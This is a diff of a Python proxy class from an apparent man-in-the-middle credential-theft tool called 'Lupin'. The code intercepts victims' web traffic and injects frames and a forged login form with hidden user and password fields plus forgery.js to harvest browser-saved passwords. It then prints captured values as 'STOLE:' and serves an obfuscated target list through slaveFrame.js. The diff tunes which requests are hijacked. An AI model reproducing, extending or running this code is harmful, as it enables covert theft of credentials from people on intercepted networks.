@@ -48,10 +48,24 @@ class ClientRequest(Request):
             return False  
              
 
-    def skipThis(self,path,client):      
-        if len(path) < 50 and path.find(".") == -1  and self.isCompromised(client) == False:
+    def skipThis(self,host,path,client):  
+
+        if len(path) > 50:
+		return True
+
+	if "google" in host and "/complete/search?" in path:
+		return True;
+
+	if '.' in path and ".html" not in path and ".php" not in path:
+		return True
+
+	#if hibernate():
+	#	return True
+	
+	if self.isCompromised(client) == False:
            return False 
-        return True     
+
+
    
 
     def obfuscate(self,string):
@@ -76,7 +90,8 @@ class ClientRequest(Request):
            # clientFile = open("victims/"+client,'a+')
            for cred in uri:
               #clientFile.write(cred[1:]+"\n")
-              print "STOLE: "+cred[1:]
+	      if '|' in cred:
+                 print "STOLE: "+cred[1:]
            #clientFile.close()
 
         except IOError as (errno, strerror):
@@ -97,19 +112,22 @@ class ClientRequest(Request):
         headers           = self.cleanHeaders()
         agent             = self.getHeader("user-agent").upper()
         
-        if agent.find("CHROME/") > -1:
-            agent = "CHROME"
-        elif agent.find("FIREFOX/") > -1:
-            agent = "FIREFOX"
+        if "CHROME/" in agent or "FIREFOX/" in agent:
+            agent = "CHROME/FF"
         else:
             agent = "OTHER" 
              
-        if path.find("Lupin=") != -1:
-            if path.find("NOTHING") != -1:
+
+ 	if "slaveFrame.js" in path:
+            self.sendMaster()
+            return
+	
+        if "Lupin=" in path:
+            if "NOTHING" in path:
                 self.sendOK()
             else:
                 self.saveCreds(client)
-                if path.find("KILL") != -1:
+                if "KILL" in path:
                    self.sendWrapUp()
                 else:
                    self.sendOK()
@@ -117,17 +135,17 @@ class ClientRequest(Request):
             return
 
 
-        if url.find("q=12345")  != -1:     
+        if "q=12345" in url:     
            tmp = path.find("q=12345")
            path = path[:tmp-1]
            if(len(path) > 1):
               host += path
-	   print "host: "+host
+	   #print "host: "+host
            self.sendForgery(host) 
            return
 
      
-        if self.skipThis(path,client):
+        if self.skipThis(host,path,client):
            actAs = "proxy"
         else:
            actAs = "framer"
@@ -143,9 +161,10 @@ class ClientRequest(Request):
            self.proxyViaHTTP(address, self.method, path, postData,actAs, headers)           
 
 
+
     def handleHostResolvedError(self, error):
         logging.warning("Host resolution error: " + str(error))
-        self.finish()
+        #self.finish()
 
     def resolveHost(self, host):
         address = self.dnsCache.getCachedAddress(host)
@@ -159,15 +178,11 @@ class ClientRequest(Request):
 
     def process(self):
         host     = self.getHeader('host') 
-        path     = self.getPathFromUri()   
-        
-        if("slaveFrame.js" in path):
-           self.sendMaster()
-        else:
-           logging.debug("Resolving host: %s" % host)          
-           deferred = self.resolveHost(host)
-           deferred.addCallback(self.handleHostResolvedSuccess)
-           deferred.addErrback(self.handleHostResolvedError)
+        path     = self.getPathFromUri()        
+        logging.debug("Resolving host: %s" % host)          
+        deferred = self.resolveHost(host)
+        deferred.addCallback(self.handleHostResolvedSuccess)
+        deferred.addErrback(self.handleHostResolvedError)
         
     def proxyViaHTTP(self, host, method, path, postData,actAs,headers):
         connectionFactory          = ServerConnectionFactory(method, path, postData, actAs,headers,self)
@@ -205,7 +220,9 @@ class ClientRequest(Request):
 
     def sendForgery(self,host):
         self.setResponseCode(200, "OK")
-        forgery = open("forgery.js")
+        self.setHeader("Connection", "close")   
+
+        forgery = open("Lupin/forgery.js")
         
 	data = "<html><head></head><body><form method=\"POST\" action="+self.getAction(host)+"><input type=\"text\" name=\"user\"/><input type=\"password\" name=\"pass\"/></form><script type=\"text/javascript\">"+forgery.read()+"</script></body></html>"
     
@@ -232,7 +249,7 @@ class ClientRequest(Request):
     def sendMaster(self):
         self.setResponseCode(200, "OK")
         self.setHeader("Connection", "keep-alive")
-        obfuscatedTargets= ""
+	obfuscatedTargets= ""
         targetFile = open("sites")
         
         for filelineno,line in enumerate(targetFile):
@@ -255,7 +272,7 @@ class ClientRequest(Request):
         obfuscatedTargets = obfuscatedTargets[:-1]
         targetFile.close() 
         
-        js = open("slaveFrame.js",'r+')
+        js = open("Lupin/slaveFrame.js",'r+')
         frame =  "<html><head><script type=\"text/javascript\">var targets=["+obfuscatedTargets+"];"+js.read() + "</script></head><body onload=\"init();\"></body></html>"
 
         js.close()
